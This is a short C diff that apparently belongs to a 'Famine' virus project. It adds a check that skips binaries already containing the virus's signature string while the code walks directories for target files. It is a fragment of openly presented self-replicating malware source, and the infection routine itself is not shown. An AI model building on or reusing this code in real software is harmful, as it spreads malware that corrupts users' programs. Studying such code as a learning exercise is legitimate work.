@@ -1,5 +1,12 @@
 #include "ft_famine.h"
 
+static bool already_infected(t_binary *binary, const char *famine)
+{
+    if(!memmem(binary->buffer, binary->file_size, famine, strlen(famine)))
+        return false;
+    return true;
+}
+
 int file_handler(char *path)
 {
     struct dirent   *dir;
@@ -25,6 +32,13 @@ int file_handler(char *path)
                     continue;
                 }
                 if(!check_file_arch(binary))
+                {
+                    free_binary(binary);
+                    free(full_path);
+                    full_path = NULL;
+                    continue;
+                }
+                if(already_infected(binary, FAMINE))
                 {
                     free_binary(binary);
                     free(full_path);
